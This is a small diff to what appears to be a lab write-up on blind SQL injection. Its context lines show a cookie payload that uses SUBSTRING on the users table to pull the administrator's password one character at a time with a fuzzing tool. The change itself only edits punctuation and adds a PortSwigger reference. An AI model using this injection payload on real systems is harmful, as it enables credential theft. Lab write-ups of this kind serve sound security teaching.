@@ -70,4 +70,8 @@ In [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) or [Burp Suite](https://por
 Cookie: TrackingId=xxx' AND (SELECT SUBSTRING(password,$index$,1) FROM users WHERE username = 'administrator') = '$guess-char$
 ```
 
-Then use the fuzz tool and we can retrieve the password.
+Then use the fuzz tool, and we can retrieve the password.
+
+## Reference
+
+- [PortSwigger](https://portswigger.net/)
